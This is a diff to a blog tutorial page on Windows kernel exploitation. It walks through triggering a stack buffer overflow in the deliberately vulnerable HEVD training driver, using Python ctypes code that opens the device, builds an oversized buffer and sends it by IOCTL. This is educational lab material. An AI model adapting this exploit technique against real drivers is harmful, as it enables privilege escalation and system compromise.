@@ -143,6 +143,15 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 </ul>
 
 <h4 id="step-one---get-a-handle">Step one - get a handle</h4>
+<blockquote>
+  <ul>
+    <li><strong>Get a handle to the vulnerable device &lt;——</strong></li>
+    <li>Get the correct IOCTL for the stack overflow function</li>
+    <li>Create a buffer with &gt;2,048 bytes of data</li>
+    <li>Trigger the vulnerable code</li>
+  </ul>
+</blockquote>
+
 <p>To get a handle to the device we need to use the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx">CreateFile</a> API in Kernel32.dll. As MSDN says, this function “Creates or opens a file or I/O device. … The function returns a handle that can be used to access the file or device for various types of I/O depending on the file or device and the flags and attributes specified.” The function prototype is pretty straightforward and doesn’t require any special structures so we can go ahead and recreate it in Python pretty easily. Each of the parameters are documented in the MSDN article. I took the hex values for each constant (GENERIC_READ, etc.) and defined that at the top of my Python script and then created a function that calls the API and returns a handle to the device (mind the Unicode!):</p>
 
 <div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="k">def</span> <span class="nf">gethandle</span><span class="p">():</span>
@@ -157,7 +166,7 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
     <span class="n">dwFlagsAndAttributes</span> <span class="o">=</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span>
     <span class="n">hTemplateFile</span> <span class="o">=</span> <span class="bp">None</span>
 
-    <span class="n">handle</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateFileW</span><span class="p">(</span><span class="n">lpFileName</span><span class="p">,</span>
+    <span class="n">handle</span> <span class="o">=</span> <span class="n">CreateFileW</span><span class="p">(</span><span class="n">lpFileName</span><span class="p">,</span>
                                         <span class="n">dwDesiredAccess</span><span class="p">,</span>
                                         <span class="n">dwShareMode</span><span class="p">,</span>
                                         <span class="n">lpSecurityAttributes</span><span class="p">,</span>
@@ -165,16 +174,25 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
                                         <span class="n">dwFlagsAndAttributes</span><span class="p">,</span>
                                         <span class="n">hTemplateFile</span><span class="p">)</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="n">handle</span> <span class="ow">or</span> <span class="n">handle</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">"[-]Error getting device handle: "</span> <span class="o">+</span> <span class="n">FormatError</span><span class="p">()</span>
+        <span class="k">print</span> <span class="s">"</span><span class="se">\t</span><span class="s">[-]Error getting device handle: "</span> <span class="o">+</span> <span class="n">FormatError</span><span class="p">()</span>
         <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
         
-    <span class="k">print</span> <span class="s">"[+]Got device handle: </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">handle</span>
+    <span class="k">print</span> <span class="s">"</span><span class="se">\t</span><span class="s">[+]Got device handle: </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">handle</span>
     <span class="k">return</span> <span class="n">handle</span>
 </code></pre>
 </div>
 <p>easy peasy.</p>
 
 <h4 id="step-two---get-the-ioctl">Step two - get the IOCTL</h4>
+<blockquote>
+  <ul>
+    <li>Get a handle to the vulnerable device</li>
+    <li><strong>Get the correct IOCTL for the stack overflow function &lt;——</strong></li>
+    <li>Create a buffer with &gt;2,048 bytes of data</li>
+    <li>Trigger the vulnerable code</li>
+  </ul>
+</blockquote>
+
 <p>IOCTLs are actually made up of four components - the device type, a function code, the I/O method, and the allowed access. This is all explained in <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx">this MSDN article</a> as well as the Windows chapter in <a href="https://www.amazon.com/Guide-Kernel-Exploitation-Attacking-Core/dp/1597494860"><em>Guide to Kernel Exploitation</em></a> among other places. The driver developer generally uses some pre-defined constants to specify these inputs except for the function code which is a hex value which can be more or less arbitrary as long as it’s above 0x7FF for 3rd party drivers. The WDK gives developers a macro to use to define these IOCTLs and you can see in HackSysExtremeVulnerableDriver.h that it is used here as well:</p>
 
 <div class="highlighter-rouge"><pre class="highlight"><code>#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
@@ -222,6 +240,15 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 <p>There is a lot more that can be said about reversing IOCTLs and maybe that would be a good blog post for another time, but hopefully this at least gives you some ideas to start with when trying to find IOCTLs in closed-source drivers. The driver has to compare the supplied IOCTL with the IOCTLs that it knows how to handle at some point so look for that.</p>
 
 <h4 id="step-three---create-the-buffer">Step three - create the buffer</h4>
+<blockquote>
+  <ul>
+    <li>Get a handle to the vulnerable device</li>
+    <li>Get the correct IOCTL for the stack overflow function</li>
+    <li><strong>Create a buffer with &gt;2,048 bytes of data &lt;——</strong></li>
+    <li>Trigger the vulnerable code</li>
+  </ul>
+</blockquote>
+
 <p>This step turns out to be pretty straightforward in Python. Ctypes gives us the <a href="https://docs.python.org/2/library/ctypes.html#ctypes.create_string_buffer">create_string_buffer()</a> function which suits our needs perfectly. We saw before that the vulnerable function is expecting a buffer of 2,048 bytes. It is safe to assume that we will not need too much more than that in order to overwrite RIP. With this in mind, I like to break out my buffer into recognizable units so I can see where certain variables are being overwritten. I’ll start with this buffer:</p>
 
 <div class="language-python highlighter-rouge"><pre class="highlight"><code>    <span class="n">evilbuf</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2048</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
@@ -231,6 +258,15 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 <p>This should let us know where we stand when we trigger the bug and we can adjust as necessary.</p>
 
 <h4 id="step-four---trigger-the-bug">Step four - trigger the bug</h4>
+<blockquote>
+  <ul>
+    <li>Get a handle to the vulnerable device</li>
+    <li>Get the correct IOCTL for the stack overflow function</li>
+    <li>Create a buffer with &gt;2,048 bytes of data</li>
+    <li><strong>Trigger the vulnerable code &lt;——</strong></li>
+  </ul>
+</blockquote>
+
 <p>As mentioned previously we now need to put everything together and use the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx">DeviceIoControl function</a> to trigger the bug. Again the MSDN page gives us the function prototype and explains all of the parameters necessary. We will give it the handle that we retrieved, the IOCTL that we generated, a pointer to our evil buffer as well as it’s size, and everything else is just null. My code looks like this:</p>
 
 <div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">dwIoControlCode</span><span class="p">):</span>
@@ -238,13 +274,13 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
 
     <span class="n">evilbuf</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2048</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
     <span class="n">lpInBuffer</span> <span class="o">=</span> <span class="n">addressof</span><span class="p">(</span><span class="n">evilbuf</span><span class="p">)</span>
-    <span class="n">nInBufferSize</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">evilbuf</span><span class="p">)</span>
+    <span class="n">nInBufferSize</span> <span class="o">=</span> <span class="mi">2064</span>
     <span class="n">lpOutBuffer</span> <span class="o">=</span> <span class="bp">None</span>
     <span class="n">nOutBufferSize</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="n">lpBytesReturned</span> <span class="o">=</span> <span class="bp">None</span>
     <span class="n">lpOverlapped</span> <span class="o">=</span> <span class="bp">None</span>
 
-    <span class="n">pwnd</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span>
+    <span class="n">pwnd</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span>
                                            <span class="n">dwIoControlCode</span><span class="p">,</span>
                                            <span class="n">lpInBuffer</span><span class="p">,</span>
                                            <span class="n">nInBufferSize</span><span class="p">,</span>
@@ -253,7 +289,7 @@ PAGE:FFFFF880037281F1           jmp     loc_FFFFF8800372831E
                                            <span class="n">lpBytesReturned</span><span class="p">,</span>
                                            <span class="n">lpOverlapped</span><span class="p">)</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="n">pwnd</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">"[-]Error: Not pwnd :(</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">FormatError</span><span class="p">()</span>
+        <span class="k">print</span> <span class="s">"</span><span class="se">\t</span><span class="s">[-]Error: Not pwnd :(</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">FormatError</span><span class="p">()</span>
         <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -371,8 +407,10 @@ IMAGE_NAME:  HEVD-Win7x64.sys
   </div>
   <hr>
   
-    <a class="prev" href="/2016/07/05/kernel-hacking-with-hevd-part-1.html">&laquo; Kernel Hacking With HEVD Part 1 - The Setup</a>
+    <div align="left"><a class="prev" href="/2016/07/05/kernel-hacking-with-hevd-part-1.html">&laquo; Kernel Hacking With HEVD Part 1 - The Setup</a></div>
   
+  
+    <div align="right"><a class="next" href="/2016/07/07/kernel-hacking-with-hevd-part-3.html">Kernel Hacking With HEVD Part 3 - The Shellcode &raquo;</a></div>
   
 </article>
 
